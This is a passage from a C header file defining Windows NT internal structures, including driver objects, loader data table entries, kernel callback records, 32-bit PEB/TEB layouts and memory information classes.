    // had its registered reinitialization routine invoked.
    //

    ULONG Count;

    //
    // The service name field is used by the pnp manager to determine
    // where the driver related info is stored in the registry.
    //

    UNICODE_STRING ServiceKeyName;

} DRIVER_EXTENSION, *PDRIVER_EXTENSION;

#define DRVO_UNLOAD_INVOKED             0x00000001
#define DRVO_LEGACY_DRIVER              0x00000002
#define DRVO_BUILTIN_DRIVER             0x00000004    // Driver objects for Hal, PnP Mgr
#define DRVO_REINIT_REGISTERED          0x00000008
#define DRVO_INITIALIZED                0x00000010
#define DRVO_BOOTREINIT_REGISTERED      0x00000020
#define DRVO_LEGACY_RESOURCES           0x00000040
// end_ntddk end_nthal end_ntifs end_ntosp
#define DRVO_BASE_FILESYSTEM_DRIVER     0x00000080   // A driver that is at the bottom of the filesystem stack.
// begin_ntddk begin_nthal begin_ntifs begin_ntosp

typedef struct _DRIVER_OBJECT {
    CSHORT Type;
    CSHORT Size;

    //
    // The following links all of the devices created by a single driver
    // together on a list, and the Flags word provides an extensible flag
    // location for driver objects.
    //

    PDEVICE_OBJECT DeviceObject;
    ULONG Flags;

    //
    // The following section describes where the driver is loaded.  The count
    // field is used to count the number of times the driver has had its
    // registered reinitialization routine invoked.
    //

    PVOID DriverStart;
    ULONG DriverSize;
    PVOID DriverSection; //PLDR_DATA_TABLE_ENTRY
    PDRIVER_EXTENSION DriverExtension;

    //
    // The driver name field is used by the error log thread
    // determine the name of the driver that an I/O request is/was bound.
    //

    UNICODE_STRING DriverName;

    //
    // The following section is for registry support.  Thise is a pointer
    // to the path to the hardware information in the registry
    //

    PUNICODE_STRING HardwareDatabase;

    //
    // The following section contains the optional pointer to an array of
    // alternate entry points to a driver for "fast I/O" support.  Fast I/O
    // is performed by invoking the driver routine directly with separate
    // parameters, rather than using the standard IRP call mechanism.  Note
    // that these functions may only be used for synchronous I/O, and when
    // the file is cached.
    //

    PFAST_IO_DISPATCH FastIoDispatch;

    //
    // The following section describes the entry points to this particular
    // driver.  Note that the major function dispatch table must be the last
    // field in the object so that it remains extensible.
    //

    PVOID DriverInit;
    PVOID DriverStartIo;
    PVOID DriverUnload;
    PVOID MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];

} DRIVER_OBJECT;
typedef struct _DRIVER_OBJECT *PDRIVER_OBJECT;

#define RESOURCE_TYPE_LEVEL     0
#define RESOURCE_NAME_LEVEL     1
#define RESOURCE_LANGUAGE_LEVEL 2
#define RESOURCE_DATA_LEVEL     3

typedef struct _LDR_RESOURCE_INFO {
    ULONG_PTR Type;
    ULONG_PTR Name;
    ULONG Lang;
} LDR_RESOURCE_INFO, *PLDR_RESOURCE_INFO;

typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    } DUMMYUNION0;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1; // Size=4 Offset=104 BitOffset=0 BitCount=1
            ULONG MarkedForRemoval : 1; // Size=4 Offset=104 BitOffset=1 BitCount=1
            ULONG ImageDll : 1; // Size=4 Offset=104 BitOffset=2 BitCount=1
            ULONG LoadNotificationsSent : 1; // Size=4 Offset=104 BitOffset=3 BitCount=1
            ULONG TelemetryEntryProcessed : 1; // Size=4 Offset=104 BitOffset=4 BitCount=1
            ULONG ProcessStaticImport : 1; // Size=4 Offset=104 BitOffset=5 BitCount=1
            ULONG InLegacyLists : 1; // Size=4 Offset=104 BitOffset=6 BitCount=1
            ULONG InIndexes : 1; // Size=4 Offset=104 BitOffset=7 BitCount=1
            ULONG ShimDll : 1; // Size=4 Offset=104 BitOffset=8 BitCount=1
            ULONG InExceptionTable : 1; // Size=4 Offset=104 BitOffset=9 BitCount=1
            ULONG ReservedFlags1 : 2; // Size=4 Offset=104 BitOffset=10 BitCount=2
            ULONG LoadInProgress : 1; // Size=4 Offset=104 BitOffset=12 BitCount=1
            ULONG LoadConfigProcessed : 1; // Size=4 Offset=104 BitOffset=13 BitCount=1
            ULONG EntryProcessed : 1; // Size=4 Offset=104 BitOffset=14 BitCount=1
            ULONG ProtectDelayLoad : 1; // Size=4 Offset=104 BitOffset=15 BitCount=1
            ULONG ReservedFlags3 : 2; // Size=4 Offset=104 BitOffset=16 BitCount=2
            ULONG DontCallForThreads : 1; // Size=4 Offset=104 BitOffset=18 BitCount=1
            ULONG ProcessAttachCalled : 1; // Size=4 Offset=104 BitOffset=19 BitCount=1
            ULONG ProcessAttachFailed : 1; // Size=4 Offset=104 BitOffset=20 BitCount=1
            ULONG CorDeferredValidate : 1; // Size=4 Offset=104 BitOffset=21 BitCount=1
            ULONG CorImage : 1; // Size=4 Offset=104 BitOffset=22 BitCount=1
            ULONG DontRelocate : 1; // Size=4 Offset=104 BitOffset=23 BitCount=1
            ULONG CorILOnly : 1; // Size=4 Offset=104 BitOffset=24 BitCount=1
            ULONG ChpeImage : 1; // Size=4 Offset=104 BitOffset=25 BitCount=1
            ULONG ReservedFlags5 : 2; // Size=4 Offset=104 BitOffset=26 BitCount=2
            ULONG Redirected : 1; // Size=4 Offset=104 BitOffset=28 BitCount=1
            ULONG ReservedFlags6 : 2; // Size=4 Offset=104 BitOffset=29 BitCount=2
            ULONG CompatDatabaseProcessed : 1; // Size=4 Offset=104 BitOffset=31 BitCount=1
        };
    } ENTRYFLAGSUNION;
    WORD ObsoleteLoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    } DUMMYUNION1;
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    } DUMMYUNION2;
    //fields below removed for compatibility
} LDR_DATA_TABLE_ENTRY_COMPATIBLE, *PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE *PLDR_DATA_TABLE_ENTRY;
typedef LDR_DATA_TABLE_ENTRY *PCLDR_DATA_TABLE_ENTRY;

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG Flags;                    //Reserved.
    PCUNICODE_STRING FullDllName;   //The full path name of the DLL module.
    PCUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
    PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
    ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_LOADED_NOTIFICATION_DATA, *PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA {
    ULONG Flags;                    //Reserved.
    PCUNICODE_STRING FullDllName;   //The full path name of the DLL module.
    PCUNICODE_STRING BaseDllName;   //The base file name of the DLL module.
    PVOID DllBase;                  //A pointer to the base address for the DLL in memory.
    ULONG SizeOfImage;              //The size of the DLL image, in bytes.
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, *PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;
typedef const LDR_DLL_NOTIFICATION_DATA *PCLDR_DLL_NOTIFICATION_DATA;

#define LDR_DLL_NOTIFICATION_REASON_LOADED   1
#define LDR_DLL_NOTIFICATION_REASON_UNLOADED 2

typedef enum _LDR_DLL_LOAD_REASON {
    LoadReasonStaticDependency,
    LoadReasonStaticForwarderDependency,
    LoadReasonDynamicForwarderDependency,
    LoadReasonDelayloadDependency,
    LoadReasonDynamicLoad,
    LoadReasonAsImageLoad,
    LoadReasonAsDataLoad,
    LoadReasonEnclavePrimary,
    LoadReasonEnclaveDependency,
    LoadReasonUnknown = -1
} LDR_DLL_LOAD_REASON, *PLDR_DLL_LOAD_REASON;

/*
* WDM END
*/


/*
** Callbacks START
*/

typedef struct _EX_CALLBACK {
    EX_FAST_REF RoutineBlock;
} EX_CALLBACK, *PEX_CALLBACK;

typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
    EX_RUNDOWN_REF RundownProtect;
    PVOID Function; //PEX_CALLBACK_FUNCTION
    PVOID Context;
} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;

typedef struct _KBUGCHECK_CALLBACK_RECORD {
    LIST_ENTRY Entry;
    PVOID CallbackRoutine;
    PVOID Buffer;
    ULONG Length;
    PUCHAR Component;
    ULONG_PTR Checksum;
    UCHAR State;
} KBUGCHECK_CALLBACK_RECORD, *PKBUGCHECK_CALLBACK_RECORD;

typedef enum _KBUGCHECK_CALLBACK_REASON {
    KbCallbackInvalid,
    KbCallbackReserved1,
    KbCallbackSecondaryDumpData,
    KbCallbackDumpIo,
    KbCallbackAddPages,
    KbCallbackSecondaryMultiPartDumpData,
    KbCallbackRemovePages,
    KbCallbackTriageDumpData
} KBUGCHECK_CALLBACK_REASON;

typedef struct _KBUGCHECK_REASON_CALLBACK_RECORD {
    LIST_ENTRY Entry;
    PVOID CallbackRoutine;
    PUCHAR Component;
    ULONG_PTR Checksum;
    KBUGCHECK_CALLBACK_REASON Reason;
    UCHAR State;
} KBUGCHECK_REASON_CALLBACK_RECORD, *PKBUGCHECK_REASON_CALLBACK_RECORD;

typedef struct _CM_CALLBACK_CONTEXT_BLOCK {
    LIST_ENTRY CallbackListEntry;
    LIST_ENTRY PreCallListHead;
    PVOID Unknown1;
    PVOID Function; //PEX_CALLBACK_FUNCTION
    UNICODE_STRING Altitude;
    LIST_ENTRY ObjectContextListHead;
} CM_CALLBACK_CONTEXT_BLOCK, *PCM_CALLBACK_CONTEXT_BLOCK;

typedef struct _SEP_LOGON_SESSION_TERMINATED_NOTIFICATION {
    struct _SEP_LOGON_SESSION_TERMINATED_NOTIFICATION *Next;
    PVOID CallbackRoutine; //PSE_LOGON_SESSION_TERMINATED_ROUTINE
} SEP_LOGON_SESSION_TERMINATED_NOTIFICATION, *PSEP_LOGON_SESSION_TERMINATED_NOTIFICATION;

typedef struct _NOTIFICATION_PACKET {
    LIST_ENTRY ListEntry;
    PVOID DriverObject; //PDRIVER_OBJECT
    PVOID NotificationRoutine; //PDRIVER_FS_NOTIFICATION
} NOTIFICATION_PACKET, *PNOTIFICATION_PACKET;

typedef struct _SHUTDOWN_PACKET {
    LIST_ENTRY ListEntry;
    PVOID DeviceObject; //PDEVICE_OBJECT
} SHUTDOWN_PACKET, *PSHUTDOWN_PACKET;

#define EX_CALLBACK_SIGNATURE 'llaC'

typedef struct _CALLBACK_OBJECT {
    ULONG Signature;
    KSPIN_LOCK Lock;
    LIST_ENTRY RegisteredCallbacks;
    BOOLEAN AllowMultipleCallbacks;
    UCHAR reserved[3];
} CALLBACK_OBJECT, *PCALLBACK_OBJECT;

typedef struct _CALLBACK_REGISTRATION {
    LIST_ENTRY Link;
    PCALLBACK_OBJECT CallbackObject;
    PVOID CallbackFunction; //PCALLBACK_FUNCTION
    PVOID CallbackContext;
    ULONG Busy;
    BOOLEAN UnregisterWaiting;
} CALLBACK_REGISTRATION, *PCALLBACK_REGISTRATION;

typedef ULONG OB_OPERATION;

typedef struct _OB_CALLBACK_CONTEXT_BLOCK {
    LIST_ENTRY CallbackListEntry;
    OB_OPERATION Operations;
    ULONG Flags;
    PVOID Registration; //POB_CALLBACK_REGISTRATION
    POBJECT_TYPE ObjectType;
    PVOID PreCallback; //POB_PRE_OPERATION_CALLBACK
    PVOID PostCallback; //POB_POST_OPERATION_CALLBACK
    EX_RUNDOWN_REF RundownReference;
} OB_CALLBACK_CONTEXT_BLOCK, *POB_CALLBACK_CONTEXT_BLOCK;

typedef struct _OB_OPERATION_REGISTRATION {
    PVOID *ObjectType;
    OB_OPERATION Operations;
    PVOID  PreOperation;
    PVOID PostOperation;
} OB_OPERATION_REGISTRATION, *POB_OPERATION_REGISTRATION;

typedef struct _OB_CALLBACK_REGISTRATION {
    USHORT                    Version;
    USHORT                    OperationRegistrationCount;
    UNICODE_STRING            Altitude;
    PVOID                     RegistrationContext;
    OB_OPERATION_REGISTRATION *OperationRegistration;
} OB_CALLBACK_REGISTRATION, *POB_CALLBACK_REGISTRATION;

#define PO_POWER_SETTINGS_REGISTRATION_TAG 'teSP'

typedef struct _POP_POWER_SETTING_REGISTRATION_V1 {
    LIST_ENTRY Link;
    ULONG Tag;
    PVOID CallbackThread; //PKTHREAD
    UCHAR UnregisterOnReturn;
    UCHAR UnregisterPending;
    GUID Guid;
    PVOID LastValue; //PPOP_POWER_SETTING_VALUE
    PVOID Callback;
    PVOID Context;
    PDEVICE_OBJECT DeviceObject;
} POP_POWER_SETTING_REGISTRATION_V1, *PPOP_POWER_SETTING_REGISTRATION_V1;

//
// WARNING: this structure definition is incomplete. 
// Tail is incorrect/incomplete for newest Win10 versions.
//
typedef struct _POP_POWER_SETTING_REGISTRATION_V2 {
    LIST_ENTRY Link;
    ULONG Tag;
    PVOID CallbackThread; //PKTHREAD   
    UCHAR UnregisterOnReturn;
    UCHAR UnregisterPending;
    GUID Guid;
    GUID Guid2;
    PVOID LastValue; //PPOP_POWER_SETTING_VALUE
    PVOID Callback;
    PVOID Context;
    PDEVICE_OBJECT DeviceObject;
} POP_POWER_SETTING_REGISTRATION_V2, *PPOP_POWER_SETTING_REGISTRATION_V2;

typedef struct _RTL_CALLBACK_REGISTER {
    ULONG Flags;
    EX_RUNDOWN_REF RundownReference;
    PVOID DebugPrintCallback;
    LIST_ENTRY ListEntry;
} RTL_CALLBACK_REGISTER, *PRTL_CALLBACK_REGISTER;

/*
** Callbacks END
*/

/*
*  NTQSI Modules START
*/

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULE_INFORMATION_EX {
    USHORT NextOffset;
    RTL_PROCESS_MODULE_INFORMATION BaseInfo;
    ULONG ImageChecksum;
    ULONG TimeDateStamp;
    PVOID DefaultBase;
} RTL_PROCESS_MODULE_INFORMATION_EX, *PRTL_PROCESS_MODULE_INFORMATION_EX;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

/*
*	NTQSI Modules END
*/

/*
** Virtual Memory START
*/

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation,
    MemoryWorkingSetInformation,
    MemoryMappedFilenameInformation,
    MemoryRegionInformation,
    MemoryWorkingSetExInformation,
    MemorySharedCommitInformation,
    MemoryImageInformation,
    MemoryRegionInformationEx,
    MemoryPrivilegedBasicInformation,
    MemoryEnclaveImageInformation,
    MemoryBasicInformationCapped
} MEMORY_INFORMATION_CLASS, *PMEMORY_INFORMATION_CLASS;

typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS {
    VmPrefetchInformation,
    VmPagePriorityInformation,
    VmCfgCallTargetInformation,
    VmPageDirtyStateInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct _MEMORY_REGION_INFORMATION {
    PVOID AllocationBase;
    ULONG AllocationProtect;
    union
    {
        ULONG RegionType;
        struct
        {
            ULONG Private : 1;
            ULONG MappedDataFile : 1;
            ULONG MappedImage : 1;
            ULONG MappedPageFile : 1;
            ULONG MappedPhysical : 1;
            ULONG DirectMapped : 1;
            ULONG SoftwareEnclave : 1;
            ULONG PageSize64K : 1;
            ULONG Reserved : 24;
        };
    };
    SIZE_T RegionSize;
    //SIZE_T CommitSize;
} MEMORY_REGION_INFORMATION, *PMEMORY_REGION_INFORMATION;

typedef struct _MEMORY_RANGE_ENTRY {
    PVOID VirtualAddress;
    SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY, *PMEMORY_RANGE_ENTRY;

/*
** Virtual Memory END
*/

/*
** System Firmware START
*/

typedef enum _SYSTEM_FIRMWARE_TABLE_ACTION {
    SystemFirmwareTable_Enumerate,
    SystemFirmwareTable_Get,
    SystemFirmwareTableMax
} SYSTEM_FIRMWARE_TABLE_ACTION, *PSYSTEM_FIRMWARE_TABLE_ACTION;

typedef struct _SYSTEM_FIRMWARE_TABLE_INFORMATION {
    ULONG ProviderSignature;
    SYSTEM_FIRMWARE_TABLE_ACTION Action;
    ULONG TableID;
    ULONG TableBufferLength;
    UCHAR TableBuffer[ANYSIZE_ARRAY];
} SYSTEM_FIRMWARE_TABLE_INFORMATION, *PSYSTEM_FIRMWARE_TABLE_INFORMATION;

/*
** System Firmware END
*/

//
//  PEB/TEB
//
#define GDI_HANDLE_BUFFER_SIZE32  34
#define GDI_HANDLE_BUFFER_SIZE64  60

#if !defined(_M_X64)
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32
#else
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64
#endif

typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];

#define RTL_MAX_DRIVE_LETTERS 32
#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001

#define GDI_MAX_HANDLE_COUNT 0x4000

// 32-bit definitions
typedef struct _STRING32 {
    USHORT Length;
    USHORT MaximumLength;
    ULONG Buffer;
} STRING32;
typedef STRING32 *PSTRING32;

typedef STRING32 UNICODE_STRING32;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
typedef struct LIST_ENTRY32 {
    DWORD Flink;
    DWORD Blink;
} LIST_ENTRY32;
typedef LIST_ENTRY32 *PLIST_ENTRY32;

typedef struct LIST_ENTRY64 {
    ULONGLONG Flink;
    ULONGLONG Blink;
} LIST_ENTRY64;
typedef LIST_ENTRY64 *PLIST_ENTRY64;
#endif

#define WOW64_POINTER(Type) ULONG

typedef struct _PEB_LDR_DATA32 {
    ULONG Length;
    BOOLEAN Initialized;
    WOW64_POINTER(HANDLE) SsHandle;
    LIST_ENTRY32 InLoadOrderModuleList;
    LIST_ENTRY32 InMemoryOrderModuleList;
    LIST_ENTRY32 InInitializationOrderModuleList;
    WOW64_POINTER(PVOID) EntryInProgress;
    BOOLEAN ShutdownInProgress;
    WOW64_POINTER(HANDLE) ShutdownThreadId;
} PEB_LDR_DATA32, *PPEB_LDR_DATA32;

#define LDR_DATA_TABLE_ENTRY_SIZE_WINXP32 FIELD_OFFSET( LDR_DATA_TABLE_ENTRY32, ForwarderLinks )

typedef struct _LDR_DATA_TABLE_ENTRY32 {
    LIST_ENTRY32 InLoadOrderLinks;
    LIST_ENTRY32 InMemoryOrderLinks;
    LIST_ENTRY32 InInitializationOrderLinks;
    WOW64_POINTER(PVOID) DllBase;
    WOW64_POINTER(PVOID) EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING32 FullDllName;
    UNICODE_STRING32 BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY32 HashLinks;
        struct
        {
            WOW64_POINTER(PVOID) SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        WOW64_POINTER(PVOID) LoadedImports;
    };
    WOW64_POINTER(PVOID) EntryPointActivationContext;
    WOW64_POINTER(PVOID) PatchInformation;
    LIST_ENTRY32 ForwarderLinks;
    LIST_ENTRY32 ServiceTagLinks;
    LIST_ENTRY32 StaticLinks;
    WOW64_POINTER(PVOID) ContextInformation;
    WOW64_POINTER(ULONG_PTR) OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;

typedef struct _CURDIR32 {
    UNICODE_STRING32 DosPath;
    WOW64_POINTER(HANDLE) Handle;
} CURDIR32, *PCURDIR32;

typedef struct _RTL_DRIVE_LETTER_CURDIR32 {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING32 DosPath;
} RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32;

typedef struct _RTL_USER_PROCESS_PARAMETERS32 {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    WOW64_POINTER(HANDLE) ConsoleHandle;
    ULONG ConsoleFlags;
    WOW64_POINTER(HANDLE) StandardInput;
    WOW64_POINTER(HANDLE) StandardOutput;
    WOW64_POINTER(HANDLE) StandardError;

    CURDIR32 CurrentDirectory;
    UNICODE_STRING32 DllPath;
    UNICODE_STRING32 ImagePathName;
    UNICODE_STRING32 CommandLine;
    WOW64_POINTER(PVOID) Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING32 WindowTitle;
    UNICODE_STRING32 DesktopInfo;
    UNICODE_STRING32 ShellInfo;
    UNICODE_STRING32 RuntimeData;
    RTL_DRIVE_LETTER_CURDIR32 CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
} RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32;

typedef struct _PEB32 {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    WOW64_POINTER(HANDLE) Mutant;

    WOW64_POINTER(PVOID) ImageBaseAddress;
    WOW64_POINTER(PPEB_LDR_DATA) Ldr;
    WOW64_POINTER(PRTL_USER_PROCESS_PARAMETERS) ProcessParameters;
    WOW64_POINTER(PVOID) SubSystemData;
    WOW64_POINTER(PVOID) ProcessHeap;
    WOW64_POINTER(PRTL_CRITICAL_SECTION) FastPebLock;
    WOW64_POINTER(PVOID) AtlThunkSListPtr;
    WOW64_POINTER(PVOID) IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ReservedBits0 : 25;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        WOW64_POINTER(PVOID) KernelCallbackTable;
        WOW64_POINTER(PVOID) UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    WOW64_POINTER(PVOID) ApiSetMap;
    ULONG TlsExpansionCounter;
    WOW64_POINTER(PVOID) TlsBitmap;
    ULONG TlsBitmapBits[2];
    WOW64_POINTER(PVOID) ReadOnlySharedMemoryBase;
    WOW64_POINTER(PVOID) HotpatchInformation;
    WOW64_POINTER(PPVOID) ReadOnlyStaticServerData;
    WOW64_POINTER(PVOID) AnsiCodePageData;
    WOW64_POINTER(PVOID) OemCodePageData;
    WOW64_POINTER(PVOID) UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    WOW64_POINTER(SIZE_T) HeapSegmentReserve;
    WOW64_POINTER(SIZE_T) HeapSegmentCommit;
    WOW64_POINTER(SIZE_T) HeapDeCommitTotalFreeThreshold;
    WOW64_POINTER(SIZE_T) HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    WOW64_POINTER(PPVOID) ProcessHeaps;

    WOW64_POINTER(PVOID) GdiSharedHandleTable;
    WOW64_POINTER(PVOID) ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    WOW64_POINTER(PRTL_CRITICAL_SECTION) LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    WOW64_POINTER(ULONG_PTR) ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER32 GdiHandleBuffer;
    WOW64_POINTER(PVOID) PostProcessInitRoutine;

    WOW64_POINTER(PVOID) TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    // Rest of structure not included.
} PEB32, *PPEB32;

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH32 {
    ULONG Offset;
    WOW64_POINTER(ULONG_PTR) HDC;
    ULONG Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH32, *PGDI_TEB_BATCH32;

#if (_MSC_VER < 1300) && !defined(_WINDOWS_)
//
// 32 and 64 bit specific version for wow64 and the debugger
//
typedef struct _NT_TIB32 {
    DWORD ExceptionList;
    DWORD StackBase;
    DWORD StackLimit;
    DWORD SubSystemTib;
    union {
        DWORD FiberData;
        DWORD Version;
    };
    DWORD ArbitraryUserPointer;
    DWORD Self;
} NT_TIB32, *PNT_TIB32;

typedef struct _NT_TIB64 {
    DWORD64 ExceptionList;
    DWORD64 StackBase;
    DWORD64 StackLimit;
    DWORD64 SubSystemTib;
    union {
        DWORD64 FiberData;
        DWORD Version;
    };
    DWORD64 ArbitraryUserPointer;
    DWORD64 Self;
} NT_TIB64, *PNT_TIB64;
#endif

typedef struct _TEB32 {
    NT_TIB32 NtTib;

    WOW64_POINTER(PVOID) EnvironmentPointer;
    CLIENT_ID32 ClientId;
    WOW64_POINTER(PVOID) ActiveRpcHandle;
    WOW64_POINTER(PVOID) ThreadLocalStoragePointer;
    WOW64_POINTER(PPEB) ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    WOW64_POINTER(PVOID) CsrClientThread;
    WOW64_POINTER(PVOID) Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    WOW64_POINTER(PVOID) WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    WOW64_POINTER(PVOID) SystemReserved1[54];
    NTSTATUS ExceptionCode;
    WOW64_POINTER(PVOID) ActivationContextStackPointer;
    BYTE SpareBytes[36];
    ULONG TxFsContext;

    GDI_TEB_BATCH32 GdiTebBatch;
    CLIENT_ID32 RealClientId;
    WOW64_POINTER(HANDLE) GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    WOW64_POINTER(PVOID) GdiThreadLocalInfo;
    WOW64_POINTER(ULONG_PTR) Win32ClientInfo[62];
    WOW64_POINTER(PVOID) glDispatchTable[233];
    WOW64_POINTER(ULONG_PTR) glReserved1[29];
    WOW64_POINTER(PVOID) glReserved2;
    WOW64_POINTER(PVOID) glSectionInfo;
    WOW64_POINTER(PVOID) glSection;
    WOW64_POINTER(PVOID) glTable;
    WOW64_POINTER(PVOID) glCurrentRC;
    WOW64_POINTER(PVOID) glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING32 StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    WOW64_POINTER(PVOID) DeallocationStack;
    WOW64_POINTER(PVOID) TlsSlots[64];
    LIST_ENTRY32 TlsLinks;
} TEB32, *PTEB32;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _GDI_HANDLE_ENTRY {
    union
    {
        PVOID Object;
        PVOID NextFree;
    };
    union
    {
        struct
        {
            USHORT ProcessId;
            USHORT Lock : 1;
            USHORT Count : 15;
        };
        ULONG Value;
    } Owner;
    USHORT Unique;
    UCHAR Type;
    UCHAR Flags;
    PVOID UserPointer;
} GDI_HANDLE_ENTRY, *PGDI_HANDLE_ENTRY;

typedef struct _GDI_SHARED_MEMORY {
    GDI_HANDLE_ENTRY Handles[GDI_MAX_HANDLE_COUNT];
} GDI_SHARED_MEMORY, *PGDI_SHARED_MEMORY;

#define FLS_MAXIMUM_AVAILABLE 128
#define TLS_MINIMUM_AVAILABLE 64
#define TLS_EXPANSION_SLOTS 1024

#define DOS_MAX_COMPONENT_LENGTH 255
#define DOS_MAX_PATH_LENGTH (DOS_MAX_COMPONENT_LENGTH + 5)

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, *PCURDIR;

